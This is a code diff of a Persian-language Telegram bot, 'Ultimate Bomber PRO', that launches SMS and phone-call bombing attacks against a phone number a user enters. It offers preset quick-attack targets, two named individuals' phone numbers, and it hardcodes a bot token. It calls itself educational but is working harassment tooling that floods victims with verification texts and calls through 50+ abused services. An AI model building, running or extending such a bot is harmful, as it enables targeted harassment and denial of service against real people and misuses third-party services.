@@ -1,18 +1,26 @@
 import os
 import asyncio
+import logging
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
-from ultimate_bomber_vip import UltimateBomberVIP
+from ultimate_bomber_pro import UltimateBomberPRO
 import urllib3
 
 # غیرفعال کردن هشدارهای SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# تنظیمات لاگ
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
 # دریافت توکن از محیط
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8503866458:AAHQCSoHmYRFiKbhEId49_TUtjcA24iGbA0")
 
 # ایجاد نمونه بمب‌افکن
-bomber = UltimateBomberVIP()
+bomber = UltimateBomberPRO()
 
 # دیکشنری برای ذخیره وضعیت کاربران
 user_sessions = {}
@@ -23,33 +31,34 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_sessions[user_id] = {
         "phone": None, 
         "attack_type": None, 
-        "requests": 150,
-        "status": "آماده"
+        "requests": 100,
+        "status": "آماده",
+        "waiting_for_phone": False
     }
     
     welcome_text = """
-🎯 **Ultimate Bomber VIP PRO** 🚀
+🎯 **Ultimate Bomber PRO** 🚀
 
-⚡ *قدرتمندترین بمب‌افکن پیامک و تماس با 50+ سرویس فعال*
+⚡ *پیشرفته‌ترین بمب‌افکن پیامک و تماس با 50+ سرویس فعال*
 
-✨ **ویژگی‌های جدید:**
-• 🚀 30+ سرویس پیامک جدید
-• 📞 20+ سرویس تماس جدید  
-• 💎 سرعت 2x بهبود یافته
+✨ **ویژگی‌های PRO:**
+• 🚀 30+ سرویس پیامک ایرانی و بین‌المللی
+• 📞 20+ سرویس تماس پیشرفته  
+• 💎 سرعت 3x بهبود یافته
 • 🎯 دقت 95% موفقیت
 • ⚡ پاسخگویی فوق سریع
 
-💎 **دستورات VIP PRO:**
-🔹 /bomb - شروع حمله جدید
+💎 **دستورات اصلی:**
+🔹 /attack - شروع حمله جدید
 🔹 /quick - حمله سریع پیش‌فرض
 🔹 /stop - توقف حمله فعلی  
 🔹 /status - وضعیت لحظه‌ای
 🔹 /help - راهنمای کامل
 
-🎪 **انواع حمله PRO:**
-• 🚀 SMS Bomber VIP - 30+ سرویس
-• 📞 Call Bomber VIP - 20+ سرویس  
-• 💎 Super VIP - ترکیب 50+ سرویس
+🎪 **انواع حمله:**
+• 🚀 SMS Bomber - سرویس‌های پیامک
+• 📞 Call Bomber - سرویس‌های تماس  
+• 💎 Super Bomber - ترکیب قدرتمند
 
 ⚠️ **توجه:** این ربات فقط برای اهداف آموزشی ارائه شده است.
     """
@@ -64,7 +73,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)
 
-async def bomb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """شروع حمله جدید"""
     user_id = update.effective_user.id
     
@@ -72,13 +81,17 @@ async def bomb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_sessions[user_id] = {
             "phone": None, 
             "attack_type": None, 
-            "requests": 150,
-            "status": "آماده"
+            "requests": 100,
+            "status": "آماده",
+            "waiting_for_phone": True
         }
+    else:
+        user_sessions[user_id]["waiting_for_phone"] = True
     
     if context.args:
         phone = context.args[0]
         user_sessions[user_id]["phone"] = phone
+        user_sessions[user_id]["waiting_for_phone"] = False
         await ask_attack_type(update, context)
         return
     
@@ -89,9 +102,10 @@ async def bomb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "🎯 **حمله جدید**\n\n📱 **لطفا شماره تلفن را وارد کنید:**\n\n"
+        "🎯 **شروع حمله جدید**\n\n📱 **لطفا شماره تلفن را وارد کنید:**\n\n"
         "• فرمت: `09123456789`\n"
-        "• یا از دکمه زیر استفاده کنید", 
+        "• یا از دکمه زیر استفاده کنید\n\n"
+        "💡 می‌توانید شماره را مستقیماً در چت تایپ کنید", 
         parse_mode='Markdown',
         reply_markup=reply_markup
     )
@@ -108,7 +122,7 @@ async def quick_attack_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "⚡ **حمله سریع Super VIP**\n\n"
+        "⚡ **حمله سریع Super Bomber**\n\n"
         "🎯 انتخاب شماره هدف از لیست پیش‌فرض:\n\n"
         "• 🎭 یاسینی: `09335037492`\n"
         "• 🎯 حسنی: `09122805035`\n\n"
@@ -121,21 +135,21 @@ async def ask_attack_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """پرسش نوع حمله"""
     keyboard = [
         [
-            InlineKeyboardButton("🚀 SMS VIP", callback_data="sms_vip"),
-            InlineKeyboardButton("📞 CALL VIP", callback_data="call_vip")
+            InlineKeyboardButton("🚀 SMS Bomber", callback_data="sms"),
+            InlineKeyboardButton("📞 CALL Bomber", callback_data="call")
         ],
-        [InlineKeyboardButton("💎 SUPER VIP", callback_data="super_vip")],
+        [InlineKeyboardButton("💎 SUPER Bomber", callback_data="both")],
         [InlineKeyboardButton("🔙 بازگشت", callback_data="main_menu")]
     ]
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "🎯 **انتخاب نوع حمله VIP PRO**\n\n"
-        "• 🚀 **SMS Bomber VIP** - 30+ سرویس پیامک\n"
-        "• 📞 **Call Bomber VIP** - 20+ سرویس تماس\n"  
-        "• 💎 **Super VIP** - ترکیب 50+ سرویس\n\n"
-        "⚡ قدرت: Super VIP > SMS VIP > Call VIP",
+        "🎯 **انتخاب نوع حمله**\n\n"
+        "• 🚀 **SMS Bomber** - 30+ سرویس پیامک\n"
+        "• 📞 **Call Bomber** - 20+ سرویس تماس\n"  
+        "• 💎 **Super Bomber** - ترکیب 50+ سرویس\n\n"
+        "⚡ قدرت: Super > SMS > Call",
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
@@ -152,15 +166,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_sessions[user_id] = {
             "phone": None, 
             "attack_type": None, 
-            "requests": 150,
-            "status": "آماده"
+            "requests": 100,
+            "status": "آماده",
+            "waiting_for_phone": False
         }
     
+    # مدیریت منوی اصلی
     if data == "main_menu":
         await start(query, context)
         return
     elif data == "start_attack":
-        await bomb_handler(query, context)
+        await attack_handler(query, context)
         return
     elif data == "quick_attack":
         await quick_attack_handler(query, context)
@@ -172,18 +188,26 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await help_handler(query, context)
         return
     elif data == "enter_number":
+        user_sessions[user_id]["waiting_for_phone"] = True
         await query.message.reply_text(
             "📱 **لطفا شماره تلفن را ارسال کنید:**\n\nمثال: `09123456789`",
             parse_mode='Markdown'
         )
         return
+    
+    # مدیریت حمله سریع
     elif data in ["quick_yasini", "quick_hasani"]:
         preset_name = "yasini" if data == "quick_yasini" else "hasani"
         await execute_quick_attack(query, preset_name)
         return
-    elif data in ["sms_vip", "call_vip", "super_vip"]:
+    
+    # مدیریت نوع حمله
+    elif data in ["sms", "call", "both"]:
         user_sessions[user_id]["attack_type"] = data
+        user_sessions[user_id]["waiting_for_phone"] = False
         await ask_requests_count(query)
+    
+    # مدیریت تعداد درخواست‌ها
     elif data.startswith("requests_"):
         requests_count = int(data.split("_")[1])
         user_sessions[user_id]["requests"] = requests_count
@@ -192,19 +216,19 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def execute_quick_attack(query, preset_name):
     """اجرای حمله سریع"""
     preset_info = {
-        "yasini": {"name": "زمانی", "number": "09335037492", "icon": "🎭"},
+        "yasini": {"name": "یاسینی", "number": "09335037492", "icon": "🎭"},
         "hasani": {"name": "حسنی", "number": "09122805035", "icon": "🎯"}
     }
     
     info = preset_info[preset_name]
     
     status_text = f"""
-{info['icon']} **شروع حمله سریع Super VIP**
+{info['icon']} **شروع حمله سریع Super Bomber**
 
 📞 شماره: `{info['number']}`
 🎯 هدف: {info['name']}
-💎 نوع: Super VIP
-🔢 تعداد: 300 درخواست
+💎 نوع: Super Bomber
+🔢 تعداد: 250 درخواست
 ⚡ وضعیت: در حال اجرا...
 
 ⏳ لطفا منتظر بمانید، این عملیات ممکن است 2-3 دقیقه طول بکشد.
@@ -224,7 +248,7 @@ async def execute_quick_attack(query, preset_name):
             )
         else:
             result_text = f"""
-🎉 **حمله سریع Super VIP تکمیل شد!** ✅
+🎉 **حمله سریع Super Bomber تکمیل شد!** ✅
 
 {info['icon']} **هدف:** {info['name']}
 📞 شماره: `{result['phone']}`
@@ -239,12 +263,12 @@ async def execute_quick_attack(query, preset_name):
 """
             
             if result.get('working_services'):
-                for service in result['working_services']:
+                for service in result['working_services'][:8]:
                     result_text += f"• {service}\n"
             else:
                 result_text += "• هیچ سرویس فعالی یافت نشد\n"
             
-            result_text += f"\n🔄 برای حمله جدید /bomb را ارسال کنید"
+            result_text += f"\n🔄 برای حمله جدید /attack را ارسال کنید"
             
             keyboard = [
                 [InlineKeyboardButton("🔄 حمله مجدد", callback_data=f"quick_{preset_name}")],
@@ -271,15 +295,15 @@ async def ask_requests_count(query):
     attack_type = user_sessions[user_id]["attack_type"]
     
     # تنظیم تعداد درخواست پیش‌فرض بر اساس نوع حمله
-    if attack_type == "sms_vip":
-        default_requests = 150
-        max_requests = 200
-    elif attack_type == "call_vip":
-        default_requests = 120
-        max_requests = 180
+    if attack_type == "sms":
+        default_requests = 100
+        max_requests = 150
+    elif attack_type == "call":
+        default_requests = 80
+        max_requests = 120
     else:
-        default_requests = 250
-        max_requests = 300
+        default_requests = 200
+        max_requests = 250
     
     keyboard = [
         [
@@ -294,9 +318,9 @@ async def ask_requests_count(query):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     attack_name = {
-        "sms_vip": "SMS Bomber VIP",
-        "call_vip": "Call Bomber VIP", 
-        "super_vip": "Super VIP"
+        "sms": "SMS Bomber",
+        "call": "Call Bomber", 
+        "both": "Super Bomber"
     }.get(user_sessions[user_id]["attack_type"])
     
     await query.message.reply_text(
@@ -313,8 +337,8 @@ async def start_attack(query):
     user_id = query.from_user.id
     user_data = user_sessions.get(user_id, {})
     phone = user_data.get("phone")
-    attack_type = user_data.get("attack_type", "sms_vip")
-    requests_count = user_data.get("requests", 150)
+    attack_type = user_data.get("attack_type", "sms")
+    requests_count = user_data.get("requests", 100)
     
     if not phone:
         await query.message.reply_text("❌ **خطا:** شماره تلفن تنظیم نشده است!")
@@ -322,10 +346,10 @@ async def start_attack(query):
     
     # نمایش اطلاعات حمله
     attack_info = {
-        "sms_vip": {"name": "SMS Bomber VIP", "icon": "🚀"},
-        "call_vip": {"name": "Call Bomber VIP", "icon": "📞"},
-        "super_vip": {"name": "Super VIP", "icon": "💎"}
-    }.get(attack_type, {"name": "SMS Bomber VIP", "icon": "🚀"})
+        "sms": {"name": "SMS Bomber", "icon": "🚀"},
+        "call": {"name": "Call Bomber", "icon": "📞"},
+        "both": {"name": "Super Bomber", "icon": "💎"}
+    }.get(attack_type, {"name": "SMS Bomber", "icon": "🚀"})
     
     info_text = f"""
 {attack_info['icon']} **شروع حمله {attack_info['name']}**
@@ -344,12 +368,12 @@ async def start_attack(query):
         user_sessions[user_id]["status"] = "در حال اجرا"
         
         # شروع حمله بر اساس نوع
-        if attack_type == "sms_vip":
-            result = bomber.start_sms_bomber_vip(phone, requests_count)
-        elif attack_type == "call_vip":
-            result = bomber.start_call_bomber_vip(phone, requests_count)
+        if attack_type == "sms":
+            result = bomber.start_sms_bomber(phone, requests_count)
+        elif attack_type == "call":
+            result = bomber.start_call_bomber(phone, requests_count)
         else:
-            result = bomber.start_super_vip(phone, requests_count)
+            result = bomber.start_super_bomber(phone, requests_count)
         
         if "error" in result:
             await status_message.edit_text(
@@ -374,12 +398,12 @@ async def start_attack(query):
 """
             
             if result.get('working_services'):
-                for service in result['working_services']:
+                for service in result['working_services'][:8]:
                     result_text += f"• {service}\n"
             else:
                 result_text += "• هیچ سرویس فعالی یافت نشد\n"
             
-            result_text += f"\n🔄 برای حمله جدید /bomb را ارسال کنید"
+            result_text += f"\n🔄 برای حمله جدید /attack را ارسال کنید"
             
             keyboard = [
                 [InlineKeyboardButton("🔄 حمله مجدد", callback_data="start_attack")],
@@ -425,12 +449,11 @@ async def status_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_data = user_sessions.get(user_id, {})
     
-    # محاسبه آمار پیشرفته
-    total_attempts = bomber.success_count + bomber.failed_count
-    success_rate = (bomber.success_count / total_attempts * 100) if total_attempts > 0 else 0
+    # دریافت وضعیت از بمب‌افکن
+    attack_status = bomber.get_attack_status()
     
     status_text = f"""
-📊 **وضعیت سیستم Ultimate Bomber VIP PRO**
+📊 **وضعیت سیستم Ultimate Bomber PRO**
 
 👤 **وضعیت کاربر:**
 • 🔄 وضعیت: {user_data.get('status', 'ناشناخته')}
@@ -439,14 +462,15 @@ async def status_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • 🔢 تعداد درخواست: {user_data.get('requests', 0)}
 
 📈 **آمار کلی سیستم:**
-• ✅ درخواست‌های موفق: {bomber.success_count:,}
-• ❌ درخواست‌های ناموفق: {bomber.failed_count:,}
-• 📊 مجموع درخواست‌ها: {total_attempts:,}
-• 🎯 نرخ موفقیت: {success_rate:.1f}%
-• 🟢 وضعیت سیستم: فعال
+• ✅ درخواست‌های موفق: {attack_status['success_count']:,}
+• ❌ درخواست‌های ناموفق: {attack_status['failed_count']:,}
+• 📊 تکمیل شده: {attack_status['completed_requests']:,} / {attack_status['total_requests']:,}
+• 🎯 سرویس‌های فعال: {attack_status['working_services']}
+• ⚡ حمله‌های فعال: {attack_status['active_attacks']}
+• 🟢 وضعیت سیستم: {'فعال' if not attack_status['active'] else 'در حال اجرا'}
 
 💡 **دستورات سریع:**
-• /bomb - حمله جدید
+• /attack - حمله جدید
 • /quick - حمله سریع
 • /stop - توقف حمله
 """
@@ -466,20 +490,20 @@ async def status_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """راهنمای کامل"""
     help_text = """
-📖 **راهنمای Ultimate Bomber VIP PRO**
+📖 **راهنمای Ultimate Bomber PRO**
 
 🎯 **دستورات اصلی:**
 • /start - شروع کار با ربات
-• /bomb [شماره] - شروع حمله جدید
+• /attack [شماره] - شروع حمله جدید
 • /quick - حمله سریع پیش‌فرض
 • /stop - توقف حمله فعلی
 • /status - وضعیت لحظه‌ای سیستم
 • /help - نمایش این راهنما
 
-⚡ **انواع حمله PRO:**
-• 🚀 **SMS Bomber VIP** - 30+ سرویس پیامک
-• 📞 **Call Bomber VIP** - 20+ سرویس تماس  
-• 💎 **Super VIP** - ترکیب 50+ سرویس
+⚡ **انواع حمله:**
+• 🚀 **SMS Bomber** - 30+ سرویس پیامک
+• 📞 **Call Bomber** - 20+ سرویس تماس  
+• 💎 **Super Bomber** - ترکیب 50+ سرویس
 
 🎪 **حمله سریع:**
 • شماره‌های پیش‌فرض یاسینی و حسنی
@@ -487,8 +511,8 @@ async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • مناسب برای تست سریع
 
 📱 **نحوه استفاده:**
-1. شماره تلفن را وارد کنید (با /bomb یا مستقیم)
-2. نوع حمله VIP را انتخاب کنید
+1. شماره تلفن را وارد کنید (با /attack یا مستقیم)
+2. نوع حمله را انتخاب کنید
 3. تعداد درخواست‌ها را مشخص کنید
 4. منتظر نتیجه بمانید
 
@@ -521,29 +545,52 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_sessions[user_id] = {
             "phone": None, 
             "attack_type": None, 
-            "requests": 150,
-            "status": "آماده"
+            "requests": 100,
+            "status": "آماده",
+            "waiting_for_phone": False
         }
     
-    # اگر متن شامل شماره است
-    if any(c.isdigit() for c in text) and len(text) >= 10:
-        user_sessions[user_id]["phone"] = text
-        await ask_attack_type(update, context)
-    else:
-        keyboard = [
-            [InlineKeyboardButton("🎯 شروع حمله", callback_data="start_attack")],
-            [InlineKeyboardButton("🏠 منوی اصلی", callback_data="main_menu")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await update.message.reply_text(
-            "❌ **شماره تلفن معتبر نیست!**\n\n"
-            "لطفا یک شماره تلفن معتبر ایرانی وارد کنید:\n"
-            "مثال: `09123456789`\n\n"
-            "یا از دکمه زیر استفاده کنید:",
-            parse_mode='Markdown',
-            reply_markup=reply_markup
-        )
+    # اگر کاربر منتظر شماره است
+    if user_sessions[user_id].get("waiting_for_phone", False):
+        # بررسی اینکه متن شامل شماره است
+        if any(c.isdigit() for c in text) and len(text) >= 10:
+            # استخراج شماره از متن
+            phone = ''.join(filter(str.isdigit, text))
+            if len(phone) >= 10:
+                user_sessions[user_id]["phone"] = phone
+                user_sessions[user_id]["waiting_for_phone"] = False
+                await ask_attack_type(update, context)
+                return
+            else:
+                await update.message.reply_text(
+                    "❌ **شماره تلفن بسیار کوتاه است!**\n\n"
+                    "لطفا یک شماره تلفن معتبر وارد کنید:\n"
+                    "مثال: `09123456789`",
+                    parse_mode='Markdown'
+                )
+                return
+        else:
+            await update.message.reply_text(
+                "❌ **شماره تلفن معتبر نیست!**\n\n"
+                "لطفا یک شماره تلفن معتبر وارد کنید:\n"
+                "مثال: `09123456789`",
+                parse_mode='Markdown'
+            )
+            return
+    
+    # اگر پیام معمولی است
+    keyboard = [
+        [InlineKeyboardButton("🎯 شروع حمله", callback_data="start_attack")],
+        [InlineKeyboardButton("🏠 منوی اصلی", callback_data="main_menu")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        "💎 **Ultimate Bomber PRO**\n\n"
+        "برای شروع حمله جدید از دکمه زیر استفاده کنید:",
+        parse_mode='Markdown',
+        reply_markup=reply_markup
+    )
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """مدیریت خطاها"""
@@ -575,7 +622,7 @@ def main():
     
     # اضافه کردن handlerها
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("bomb", bomb_handler))
+    app.add_handler(CommandHandler("attack", attack_handler))
     app.add_handler(CommandHandler("quick", quick_attack_handler))
     app.add_handler(CommandHandler("stop", stop_handler))
     app.add_handler(CommandHandler("status", status_handler))
@@ -587,10 +634,11 @@ def main():
     app.add_error_handler(error_handler)
     
     # شروع ربات
-    print("🎯 Ultimate Bomber VIP PRO Bot Started...")
+    print("🎯 Ultimate Bomber PRO Bot Started...")
     print("🤖 Bot is now listening for messages...")
     print("🔗 Token:", TOKEN[:10] + "..." if TOKEN else "Not Found")
     print("💎 Enhanced with 50+ services and quick attack feature")
+    print("🚀 Fixed all issues and improved reliability")
     
     app.run_polling(drop_pending_updates=True)
 
